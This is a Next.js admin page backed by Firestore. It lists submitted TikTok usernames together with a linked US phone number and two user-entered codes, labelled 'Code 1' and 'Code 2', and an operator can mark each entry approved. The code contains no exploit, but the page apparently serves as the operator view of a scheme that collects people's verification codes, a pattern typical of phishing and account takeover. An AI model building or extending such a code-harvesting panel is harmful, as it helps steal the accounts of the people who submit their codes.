

'use client';

import {
  Table,
  TableBody,
  TableCaption,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table"
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { useCollection, useFirestore, useMemoFirebase } from "@/firebase";
import { collection, query, doc } from "firebase/firestore";
import { Loader2, CheckCircle, UserX } from "lucide-react";
import { useAuth } from "@/firebase";
import { Button } from "@/components/ui/button";
import { useRouter } from "next/navigation";
import { updateDocumentNonBlocking } from "@/firebase/non-blocking-updates";


export default function AdminPage() {
  const firestore = useFirestore();
  const auth = useAuth();
  const router = useRouter();

  const usersQuery = useMemoFirebase(() => {
      if (!firestore) return null;
      return query(collection(firestore, 'tiktok_users'));
    }, [firestore]);

  const { data: users, isLoading: usersLoading } = useCollection(usersQuery);

  const handleLogout = async () => {
    if (!auth) return;
    try {
        await auth.signOut();
        router.push('/login');
    } catch (e) {
        console.error("Logout failed", e);
    }
  };

  const handleApprove = (userId: string) => {
    if (!firestore) return;
    const userDocRef = doc(firestore, 'tiktok_users', userId);
    updateDocumentNonBlocking(userDocRef, { isVerified: true });
  }

  const renderContent = () => {
    if (usersLoading) {
        return (
             <div className="flex flex-col items-center justify-center h-64 text-center">
                <Loader2 className="h-8 w-8 animate-spin text-primary mb-4" />
                <p className="text-muted-foreground">Loading submissions...</p>
             </div>
        );
    }

    if (!users || users.length === 0) {
        return (
             <div className="flex flex-col items-center justify-center h-64 text-center">
                <UserX className="h-12 w-12 text-muted-foreground mb-4" />
                <p className="font-semibold">No submissions yet</p>
                <p className="text-muted-foreground text-sm">When a user fills out the form, their submission will appear here.</p>
             </div>
        );
    }

    return (
        <Table>
            <TableCaption>A list of accounts pending manual approval.</TableCaption>
            <TableHeader>
              <TableRow>
                <TableHead>TikTok Username</TableHead>
                <TableHead>Linked US Number</TableHead>
                <TableHead>Code 1</TableHead>
                <TableHead>Code 2</TableHead>
                <TableHead>Status</TableHead>
                <TableHead className="text-right">Action</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {users?.map((user) => (
                <TableRow key={user.id}>
                  <TableCell className="font-medium">@{user.tiktokUsername}</TableCell>
                  <TableCell>{user.phoneNumber || 'Not Selected'}</TableCell>
                  <TableCell>{user.verificationCode || 'N/A'}</TableCell>
                   <TableCell>{user.finalCode || 'N/A'}</TableCell>
                  <TableCell>
                    <Badge variant={user.isVerified ? 'default' : 'secondary'}>
                      {user.isVerified ? 'Approved' : 'Pending'}
                    </Badge>
                  </TableCell>
                  <TableCell className="text-right">
                    {!user.isVerified ? (
                       <Button onClick={() => handleApprove(user.id)} size="sm">
                          Approve
                       </Button>
                    ) : (
                        <div className="flex items-center justify-end text-green-600">
                           <CheckCircle className="h-5 w-5 mr-2"/>
                           Approved
                        </div>
                    )}
                  </TableCell>
                </TableRow>
              ))}
            </TableBody>
        </Table>
    );
  }

  return (
    <div className="container py-8">
      <Card>
        <CardHeader className="flex flex-row items-center justify-between">
          <div>
            <CardTitle>Admin Control Panel</CardTitle>
            <CardDescription>
              List of TikTok usernames pending approval.
            </CardDescription>
          </div>
          <Button onClick={handleLogout} variant="outline">Logout</Button>
        </CardHeader>
        <CardContent>
            {renderContent()}
        </CardContent>
      </Card>
    </div>
  );
}
